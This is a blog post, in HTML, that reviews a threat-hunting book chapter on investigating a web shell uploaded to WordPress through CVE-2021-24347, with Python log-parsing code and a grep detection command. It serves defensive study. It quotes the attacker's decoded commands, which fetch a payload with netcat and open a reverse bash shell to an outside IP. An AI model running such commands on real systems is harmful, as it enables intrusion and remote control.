@@ -1,0 +1,336 @@
+<!doctype html>
+<meta charset="utf-8">
+<script src="https://distill.pub/template.v1.js"></script>
+
+<script type="text/front-matter">
+  title: "Luca Vaudano&#x27;s Blog"
+  description: "04 Apr, 2025"
+  authors:
+  - Luca Vauda: https://lucavauda.github.io/
+  affiliations:
+  # - Your Affiliation: http://example.com
+</script>
+
+<dt-article>
+  <h1>Luca Vaudano&#x27;s Blog</h1>
+  <dt-byline></dt-byline>
+  
+  <main>
+
+<p>
+<i>
+<time datetime="2025-04-04T06:56Z">
+                    04 Apr, 2025
+                </time>
+</i>
+</p>
+<p>I’m continuing the series of reviewing the book <a href="https://www.manning.com/books/cyber-threat-hunting">Cyber Threat Hunting</a>, by Nadhem AlFardan, published by Manning. If you haven’t read the one before, I strongly suggest you reading the <a href="https://lucavauda.bearblog.dev/my-first-threat-hunting-expedition/">previous post</a>, as they are strongly correlated.</p>
+<p>You will fine the specific files for the chapter in question at this <a href="https://github.com/lucavauda/CyberThreatHunting_TechReview/tree/main/chapter4">link</a> (my GitHub repo).</p>
+<p>This is Chapter 4 called <strong>Threat Intelligence for Threat Hunting</strong>.</p>
+<h2 id="strongthreat-intelligence-for-threat-huntingstrong"><strong>Threat Intelligence for Threat Hunting</strong></h2><h3 id="context">Context</h3><p>In this chapter, other teams are involved. The threat intelligence team suggested a possible vulnerability that allows attackers to upload web shells. We receive a report from one of them:</p>
+<blockquote>
+<p>The threat intelligence report describes the active exploitation of a recently announced vulnerability in a WordPress plugin deployed in a self-hosted production web server the organization hosts on a public cloud service provider.</p>
+</blockquote>
+<p>So the context is that we have a web-application, running with WordPress, with a possible piece of code that could run a Remote Code Execution (RCE). The vulnerability is <a href="https://www.google.com/url?sa=t&amp;source=web&amp;rct=j&amp;opi=89978449&amp;url=https://nvd.nist.gov/vuln/detail/CVE-2021-24347&amp;ved=2ahUKEwijkq2a6riMAxWn8LsIHXuqIlgQFnoECAIQAQ&amp;usg=AOvVaw3O33GkuFql6RBa3dL7kPWr"><strong>CVE-2021-24347</strong></a>, here’s a brief description from NIST:</p>
+<blockquote>
+<p>The SP Project &amp; Document Manager WordPress plugin before 4.22 allows users to upload files, however, the plugin attempts to prevent php and other similar files that could be executed on the server from being uploaded by checking the file extension. It was discovered that php files could still be uploaded by changing the file extension's case, for example, from "php" to "pHP".</p>
+</blockquote>
+<p>The timeline we are given is the following:</p>
+<ul>
+<li>January 10: The system administrator created the account in question, supplier007, and provided the user access to the WordPress projects portal.</li>
+<li>April 10: The system administrator installed the vulnerable version of the plugin on the WordPress server</li>
+<li>June 2: The credentials of the account, <em>supplier007</em>, were posted for sale on the dark web.</li>
+<li>June 14: The plugin vulnerability, CVE-2021-24347, was made public.</li>
+<li>June 18: The system administrator installed a new plugin version.</li>
+<li>June 22: The external cyber threat intelligence provider informed the threat intelligence team about a compromised account, <em>supplier007</em>.</li>
+<li>June 23: The threat intelligence team shared the threat intelligence report with the threat hunter</li>
+</ul>
+<p>The two sources of data we will analyze are the Apache2 web access events from the web server hosting the WordPress site and the firewall events for inbound and outbound connections to and from the web server.</p>
+<p>Other information are not reported but are available in the book in more details.</p>
+<h3 id="threat-hunt">Threat Hunt</h3><p>Our first attempt should be looking at logs that indicates malicious upload attempts.</p>
+<p>Last time I used PowerShell to write the queries in this book, for the following chapters I will try to use Python, in order to filter the desired results and turn them automatically into a JSON format (Claude, my best friend surely will help doing so). This query will search for Apache2 access events and extract filenames in web requests.</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">collections</span><span class="w"> </span><span class="kn">import</span> <span class="n">Counter</span>
+
+<span class="c1"># Define the regex to parse the log line.</span>
+<span class="n">log_pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span>
+    <span class="sa">r</span><span class="s1">'^(\S+) \S+ \S+ \[(.*?)\] "(\S+) (\S+) (\S+)" (\d+) \d+ ".*?" ".*?"$'</span>
+<span class="p">)</span>
+<span class="c1"># This pattern captures:</span>
+<span class="c1">#   Group 1: IP</span>
+<span class="c1">#   Group 2: timestamp</span>
+<span class="c1">#   Group 3: HTTP method</span>
+<span class="c1">#   Group 4: path</span>
+<span class="c1">#   Group 5: protocol (e.g., HTTP/1.1)</span>
+<span class="c1">#   Group 6: status</span>
+
+<span class="c1"># Regex for extracting the filename from the path (similar to the Humio regex).</span>
+<span class="n">filename_pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">"(?P&lt;filename&gt;\w+\.\w+)"</span><span class="p">)</span>
+
+<span class="c1"># A counter to group and count occurrences of each filename.</span>
+<span class="n">filename_counter</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">()</span>
+
+<span class="c1"># Open and process the log file.</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"ch4_web_access_events.log"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">file</span><span class="p">:</span>
+        <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="c1"># Removes the any leading, and trailing whitespaces.</span>
+        <span class="n">match</span> <span class="o">=</span> <span class="n">log_pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+            <span class="n">ip</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">protocol</span><span class="p">,</span> <span class="n">status</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">groups</span><span class="p">()</span>
+            <span class="c1"># Emulate the replace command:</span>
+            <span class="c1"># In the Humio query, this step removes the substring "HTTP/1.1" from the field 'path'</span>
+            <span class="c1"># and stores the result in 'path_only'. In our parsed data, 'path' comes directly from the log,</span>
+            <span class="c1"># but we simulate the replacement if needed.</span>
+            <span class="n">path_only</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">"HTTP\/1\.1"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
+
+            <span class="c1"># Extract the filename using the provided regex.</span>
+            <span class="n">filename_match</span> <span class="o">=</span> <span class="n">filename_pattern</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">path_only</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">filename_match</span><span class="p">:</span>
+                <span class="n">filename</span> <span class="o">=</span> <span class="n">filename_match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s2">"filename"</span><span class="p">)</span>
+                <span class="n">filename_counter</span><span class="p">[</span><span class="n">filename</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="c1"># Sort the results by count in descending order.</span>
+<span class="n">sorted_results</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span>
+    <span class="n">filename_counter</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span>
+<span class="p">)</span>
+
+<span class="c1"># Format the result as a list of dictionaries.</span>
+<span class="n">result</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">"filename"</span><span class="p">:</span> <span class="n">fname</span><span class="p">,</span> <span class="s2">"count"</span><span class="p">:</span> <span class="n">count</span><span class="p">}</span> <span class="k">for</span> <span class="n">fname</span><span class="p">,</span> <span class="n">count</span> <span class="ow">in</span> <span class="n">sorted_results</span><span class="p">]</span>
+
+<span class="c1"># Write the result to a JSON file.</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"result_query1.json"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">json_file</span><span class="p">:</span>
+    <span class="n">json</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">json_file</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"JSON file 'result_query1.json' created successfully."</span><span class="p">)</span>
+</pre></div>
+<p>I am not proficient in Python and still learning, but the value I get from LLMs are too much to not use them. Let’s break down the code.</p>
+<p>We have to define a regex pattern (<dt-code>log_pattern</dt-code>) to parse Apache log lines into components like IP address, timestamp, HTTP method, path, etc. The compile method <dt-code>re.compile()</dt-code> , it is used as it compiles the regex pattern more efficiently when used multiple times (note: the <dt-code>r</dt-code> prefix creates a raw string, which is useful for regex patterns since backslashes don't need to be escaped).</p>
+<ul>
+<li><dt-code>^(\S+)</dt-code>: Starts with one or more non-whitespace characters (captures the IP address)</li>
+<li><dt-code>\S+ \S+</dt-code>: Two groups of non-whitespace characters (typically identd and userid, often "-" in logs) that aren't captured</li>
+<li><dt-code>\[(.*?)\]</dt-code>: Content inside square brackets (captures the timestamp)</li>
+<li><dt-code>"(\S+) (\S+) (\S+)"</dt-code>: Three space-separated items inside quotes:<ul>
+<li>First item: HTTP method (GET, POST, etc.)</li>
+<li>Second item: Requested URL path</li>
+<li>Third item: Protocol (typically HTTP/1.1)</li>
+</ul>
+</li>
+<li><dt-code>(\d+)</dt-code>: Capture a sequence of digits (the HTTP status code)</li>
+<li><dt-code>\d+</dt-code>: Another sequence of digits (response size in bytes) that isn't captured</li>
+<li><dt-code>".*?" ".*?"</dt-code>: Two quoted strings (typically the referrer URL and user agent) that aren't captured</li>
+<li><dt-code>$</dt-code>: End of line</li>
+</ul>
+<p>Then, in order to extract filenames from URLs, let’s analyze the second regex:</p>
+<ul>
+<li><dt-code>(?P&lt;filename&gt;...)</dt-code>: Creates a named capture group called "filename"</li>
+<li><dt-code>\w+</dt-code>: One or more word characters (letters, digits, underscores) for the filename</li>
+<li><dt-code>\.</dt-code>: A literal period character</li>
+<li><dt-code>\w+</dt-code>: One or more word characters for the file extension</li>
+</ul>
+<p>So, it opens a file called "<dt-code>ch4_web_access_events.log</dt-code>”, and for each line in the log file:</p>
+<ul>
+<li>Matches the line against the log pattern</li>
+<li>Extracts the components (IP, timestamp, method, path, etc.)</li>
+<li>Removes "HTTP/1.1" from the path if present</li>
+<li>Uses the filename pattern to extract filenames from the path</li>
+<li>Counts occurrences of each filename using Counter</li>
+</ul>
+<p>After sorting it in descending order, it formats the results as a list of dictionaries with "filename" and "count" keys. At the end, the results are in the <dt-code>result_query1.json</dt-code> file. The results are not really compelling. In fact, not only are really different from the one to the book, they are also not relevant to our search. A the author points out:</p>
+<blockquote>
+<p>The search output contains filenames extracted from the Apache web access events. The result indicates that the names of the uploaded files are not captured in the web access events. Instead, the events capture web requests made to the Apache web server, for example, requests to ajax.php and login.php.</p>
+</blockquote>
+<p>Like the previous chapter, we are not seeing names of uploaded files. The first hunt if not successful, suggest us to change the approach. Let’s search web request to the vulnerable plugin, in particular to the directory called <dt-code>uploads/sp-client-document-manager/3</dt-code>.</p>
+<p>Now, the query should focus on the plugin upload directory, printing out the time, status and path_only:</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">parse_log_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+    <span class="n">log_pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span>
+        <span class="sa">r</span><span class="s1">'^(\S+) \S+ \S+ \[(.*?)\] "(\S+) (\S+) (\S+)" (\d+) \d+ ".*?" ".*?"$'</span>
+    <span class="p">)</span>
+    <span class="n">entries</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+            <span class="n">match</span> <span class="o">=</span> <span class="n">log_pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">match</span><span class="p">:</span>
+                <span class="k">continue</span>  <span class="c1"># Skip malformed lines</span>
+
+            <span class="c1"># Extract relevant components</span>
+            <span class="n">timestamp_str</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+            <span class="n">path</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+            <span class="n">status</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+
+            <span class="c1"># Apply path filter</span>
+            <span class="k">if</span> <span class="s2">"/uploads/sp-client-document-manager/3/project-plan.php"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>
+                <span class="k">continue</span>
+
+            <span class="c1"># Clean path (remove HTTP version if present)</span>
+            <span class="n">clean_path</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"HTTP/1.1"</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+
+            <span class="c1"># Parse and format timestamp</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">log_date</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">timestamp_str</span><span class="p">,</span> <span class="s2">"</span><span class="si">%d</span><span class="s2">/%b/%Y:%H:%M:%S %z"</span><span class="p">)</span>
+                <span class="n">formatted_time</span> <span class="o">=</span> <span class="n">log_date</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">"%Y/%m/</span><span class="si">%d</span><span class="s2"> %H:%M:%S"</span><span class="p">)</span>
+            <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+                <span class="k">continue</span>  <span class="c1"># Skip lines with invalid timestamps</span>
+
+            <span class="n">entries</span><span class="o">.</span><span class="n">append</span><span class="p">(</span>
+                <span class="p">{</span><span class="s2">"time"</span><span class="p">:</span> <span class="n">formatted_time</span><span class="p">,</span> <span class="s2">"status"</span><span class="p">:</span> <span class="n">status</span><span class="p">,</span> <span class="s2">"path_only"</span><span class="p">:</span> <span class="n">clean_path</span><span class="p">}</span>
+            <span class="p">)</span>
+
+    <span class="c1"># Sort entries chronologically</span>
+    <span class="n">entries</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s2">"time"</span><span class="p">],</span> <span class="s2">"%Y/%m/</span><span class="si">%d</span><span class="s2"> %H:%M:%S"</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="n">entries</span>
+
+<span class="c1"># Process the log file and save results</span>
+<span class="n">results</span> <span class="o">=</span> <span class="n">parse_log_file</span><span class="p">(</span><span class="s2">"ch4_web_access_events.log"</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"result_query2.json"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">json</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">results</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"JSON file 'result_query2.json' created successfully."</span><span class="p">)</span>
+</pre></div>
+<p>After spending hours analyzing Python code and JSON files, I noticed that the timestamps in the log file provided by the author do not match those in the book’s results. The log entries in the author-provided file exclusively span the period <strong>22 December 2021 to 3 January 2022</strong>, yet the reference results in the text demonstrate outputs dated <strong>17 June 2021</strong>. As a result, even though my script correctly processes the data, I cannot replicate the exact outputs shown in the book simply because those specific log entries do not exist in my dataset.</p>
+<p><strong>To continue my review and analysis, I will refer to the book’s results as a reference.</strong></p>
+<p>Considering one of the result, we notice that one the request is a long string, probably indicating a Base64 encoding. So after the decoding base64 queries, we notice some UNIX command executed, indicating that the adversary is aware of the o.s. of the web server (90% is Linux, so that was a good guess).</p>
+<p><strong>Summary of what we discovered so far</strong>:</p>
+<ol>
+<li>After successfully uploading a web shell called "<dt-code>project-plan.php</dt-code>" (possibly using the supplier007 account), the attacker first ran the <dt-code>whoami</dt-code> command (discovered after decoding a base64 string) to identify what user privileges they had on the system.</li>
+<li>The attacker attempted to download additional tools using <dt-code>wget</dt-code> and <dt-code>curl</dt-code> commands, but these attempts failed. This suggests these tools aren't installed on the compromised system - something that should be verified with the system administrator.</li>
+<li>Next, the attacker checked for alternative file transfer methods and discovered that netcat (nc) was available. System administrators later confirmed that while wget and curl are indeed unavailable, netcat is installed. This finding should be noted for later security recommendations.</li>
+<li>Using netcat, the attacker transferred content to the server and saved it as "project-plan" in the /tmp directory.</li>
+<li>The attacker then executed this "project-plan" file with specific parameters:<ul>
+<li>"/bin/bash" (to run a shell)</li>
+<li>IP address "34.152.29.228" and port "80" (connection destination)</li>
+<li>"<dt-code>--reconn</dt-code>" flag (likely to automatically reconnect if disconnected)</li>
+</ul>
+</li>
+<li>The lack of further logged events suggests the attacker established a new communication channel through the executed file, moving their activities outside the original access point.</li>
+<li>Notably, the attacker named their malicious files to blend in with the legitimate purpose of the web server, making detection more difficult.</li>
+</ol>
+<p>So, after this brief recap, here’s the actual timeline of events:</p>
+<ul>
+<li>@ 17/06/2021 08:00:49: Web Request including <dt-code>project-plan.php</dt-code> with Base64 encoding</li>
+</ul>
+<p>In the books there’s a reference of a TOR exit nodes: there doesn't seem to be enough information to conclude that TOR was involved in this particular attack sequence yet. For this reason, I will not include it.</p>
+<p>The author reminds us that a threat hunter in this situation would update his previous incident case, alerting the incident response team (it’s a team sport).</p>
+<p>One thing I could’ve written better in the previous chapter were questions-related tasks. So let’s write them in this format:</p>
+<ul>
+<li class="task-list-item">Do we know when <dt-code>project-plan.php</dt-code> file was uploaded?</li>
+<li class="task-list-item">Do we know who uploaded it?</li>
+<li class="task-list-item">What is the content of <dt-code>/tmp/project-plan</dt-code>?</li>
+<li class="task-list-item">Have we checked if outbound connections were successful?</li>
+</ul>
+<p>After a communication with the sys admin who gave us really important info, we discover that <strong>all log files were created on June 16</strong>, the same day as the suspicious requests, strongly suggests <strong>log tampering</strong>. The attacker likely <strong>deleted previous logs</strong> to cover their tracks. Since the logs are located in <dt-code>/var/log/apache2</dt-code>, which is typically <strong>owned by root</strong>, <strong>deleting logs requires root privileges</strong>. This indicates that the attacker has <strong>gained root-level access</strong>, which is <strong>extremely dangerous</strong>. The current log file permissions allow <strong>only root to modify them</strong>, preventing normal users from reviewing or restoring logs.</p>
+<p>The 3 in the URL path we have seen earlier, <dt-code>/wp-content/uploads/sp-client-document-manager/3</dt-code>, has been confirmed by the sys admin that is the supplier007, the request came from him (likely a compromised account) and he uploaded the file <dt-code>project-plan.php</dt-code>.</p>
+<p>Also, the sys admin shares with us that the tmp folder is empty, so the previous goal cannot be achieved.</p>
+<ul>
+<li class="task-list-item">Do we know who uploaded it? → The administrator replied to your request and identified supplier007 as user number 3</li>
+<li class="task-list-item">What is the content of <dt-code>/tmp/project-plan</dt-code>? → tmp folder empty 😞</li>
+</ul>
+<p>The when task can be achieved analyzing the firewall log using a not-so-trivial query. We’ll take a look at <strong>inbound connections</strong> logged by the cloud provider firewall.</p>
+<p>The reasoning behind it is the following:</p>
+<ul>
+<li>A few minutes (for example 10) before and after the time of the first suspicious web access event containing the Base64 encoded whoami command;</li>
+<li>Web requests destined to TCP ports 80 and 443; and</li>
+<li>Look for traffic destined to one of the nodes hosting the web portal pods.</li>
+</ul>
+<blockquote>
+<p>Reviewing the complete list of connections is time-consuming. We should get a manageable number of network connections if we restrict our search to:</p>
+</blockquote>
+<blockquote>
+</blockquote>
+<p>The output of the search shows a total of 35 connections using TCP/443, after a geolocalization query, this is the following output:</p>
+<blockquote>
+<p>185.220.100[.]250 located in DE (country code for Germany), with 33 connections
+134.209.24[.]42 located in GB (country code for Great Britain), with 1 connection
+139.162.145[.]250 located in DE, with 1 connection</p>
+</blockquote>
+<p>A VirusTotal check on the IP addresses is performed, revealing that 185.220.100[.]250 has been tagged as a TOR node (so the information on the timeline could be updated). TOR hides the true identity of the attacker, so we will not be able to know who the attacker is.</p>
+<p>Ok now let’s investigate the <strong>outbound connections</strong>. The time frame of reference is 10 minutes before and after the first suspicious web access events (whoami command).</p>
+<p>The output shows a total of 109 connections.</p>
+<ul>
+<li>"10.154.0[.]4","34.125.53[.]119","80","1": One connection that correlate with the command <dt-code>sleep 10 | nc -v 34.125.53.119 80 &gt; /tmp/project-plan &amp;&amp; chmod 755 /tmp/project-plan</dt-code>.</li>
+<li>"10.154.0.4","34.152.29.228","80","3": Three connections which correlates with the command <dt-code>/tmp/project-plan -e '/bin/bash' 34.152.29.228 80 --reconn</dt-code>. We see three connections, despite seeing one web access event. This could be due to the --reconn parameter, which might have instructed the program project-plan to reconnect whenever its connection to 34.152.29.228 is lost. It could also be other activities performed by the attacker on the compromised system.</li>
+</ul>
+<blockquote>
+<p>The following is a summary. The events source IP addresses, 10.154.0[.]2, 10.154.0[.]3 or 10.154.0[.]4, are the three Kubernetes nodes that host the web server pods.
+From the output, we see the following outbound connections which correlate to the Base64 decoded commands sent to the Web shell:</p>
+</blockquote>
+<blockquote>
+</blockquote>
+<p>After that, we can tick another of our task we were set to do. We checked outbound connection and we found 4 successful from suspicious servers.</p>
+<ul>
+<li class="task-list-item">Have we checked if outbound connections were successful? → Yes, a total of 4 suspicious outbound connection were made.</li>
+</ul>
+<p>A careful reader might have notice that the task of discovering when PHP file was uploaded, we did not solve it. This is because after a checking the outbound, we have no clear sign of it, we discover two events that might correlate to the adversary uploading the file. So, at the end, we have our hypothesis but no evidence.</p>
+<h3 id="exercises-for-this-chapter">Exercises for this chapter</h3><p>For this chapter, we have two question related to the file <strong><dt-code>project-plan.php</dt-code></strong>. You can find it on my GitHub <a href="https://github.com/lucavauda/CyberThreatHunting_TechReview/tree/main/chapter4">repo</a>. The PHP file is intentionally <dt-code>project-plan.pHp</dt-code> (with mixed-case extension) rather than <dt-code>.php</dt-code>. This links with the exact attack methodology described in CVE-2021-24347, where attackers bypass security checks by altering the case of restricted file extensions. The exercises were done with the help of Claude.</p>
+<p><strong>Question 1: How could access to the content of <dt-code>project-plan.php</dt-code> assist in the hunt expedition?</strong></p>
+<p>Having directly the file helps the threat hunter in different ways:</p>
+<ol>
+<li><strong>Identifying the attack method</strong>: The file reveals this is a web shell that allows remote command execution through browser-based interactions.</li>
+<li><strong>Understanding the obfuscation technique</strong>: The shell uses Base64 encoding to obfuscate commands, which helps avoid detection by simple pattern matching security tools.</li>
+<li><strong>Command execution mechanism</strong>: The PHP code shows exactly how commands are being executed (<dt-code>exec($decoded_command)</dt-code>) and displayed to the attacker.</li>
+<li><strong>Evidence collection</strong>: With the source code, you can determine what system commands were executed by looking at server logs for requests containing Base64-encoded parameters to this file.</li>
+<li><strong>Attribution</strong>: The code style and implementation details might match known threat actor techniques, helping with attribution.</li>
+<li><strong>Developing IOCs</strong>: You can create signatures based on this file to detect similar web shells or access patterns in your environment.</li>
+</ol>
+<p><strong>Question 2: What Linux command would you use to perform a search that looks for instances where legitimate php files on the server were modified to include some of the code contained in this web shell.</strong></p>
+<p>You can use <dt-code>grep</dt-code> with regex to target code patterns from the web shell. Example command:</p>
+<div class="highlight"><pre><span></span>grep<span class="w"> </span>-r<span class="w"> </span>--include<span class="o">=</span><span class="s2">"*.php"</span><span class="w"> </span><span class="s2">"exec\s*(\s*\$.*\$_GET\|base64_decode\|str_repeat"</span><span class="w"> </span>/var/www/
+</pre></div>
+<p>The command:</p>
+<ul>
+<li>Searches recursively (<dt-code>r</dt-code>) through the web directory</li>
+<li>Only examines PHP files (<dt-code>-include="*.php"</dt-code>)</li>
+<li>Looks for key patterns found in the web shell:<ul>
+<li><dt-code>exec</dt-code> function calls with variables</li>
+<li>References to <dt-code>$_GET</dt-code> parameters</li>
+<li>Use of <dt-code>base64_decode</dt-code></li>
+<li><dt-code>str_repeat</dt-code> function (which is less common in legitimate code)</li>
+</ul>
+</li>
+</ul>
+<h3 id="conclusion">Conclusion</h3><p>To be honest, I didn’t enjoy this chapter that much for a very specific reason: the data provided wasn’t the same as in the book. That’s OK, I think when dealing with real life, having the data already set up is a luxury not for every one. That said, I found the PHP vulnerability particularly interesting, and I learned a lot throughout the process. The real value of this chapter is at the end of the chapter, where the Threat Hunt Play is written, giving the reader a really condense summary of what our research looked like.</p>
+<form action="/upvote/xWdrBYETgGqLorbcoymN/" id="upvote-form" method="post" style="display: inline">
+<small>
+<input hidden="" name="uid" style="display:none" value="xWdrBYETgGqLorbcoymN"/>
+<input hidden="" name="title" style="display:none"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="7G3hVf8JQ3JwZUgTwHrTZNbPTlNR8TA3aafX8tPwTNmxtMCPGMYOpRNiBQiZ2GfQ"/>
+<button class="upvote-button upvoted" disabled="true" title="Toasted">
+<svg class="css-i6dzq1" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<polyline points="17 11 12 6 7 11"></polyline>
+<polyline points="17 18 12 13 7 18"></polyline>
+</svg>
+<small class="upvote-count">1</small>
+</button>
+</small>
+</form>
+<script>
+    document.querySelector('#upvote-form').addEventListener('submit', (e) => {
+        e.preventDefault();
+        const form = e.target;
+        fetch(form.action, {
+            method: form.method,
+            body: new FormData(form),
+        });
+        const button = form.querySelector('button')
+        button.disabled = true
+        button.style.color = "salmon"
+        const upvoteCount = document.querySelector('.upvote-count')
+        upvoteCount.innerHTML = `${(parseInt(upvoteCount.innerHTML.split(" ")[0]) + 1)}`
+    });
+</script>
+</main>
+</dt-article>
+
+<dt-appendix>
+</dt-appendix>
+
+<script type="text/bibliography">
+</script>
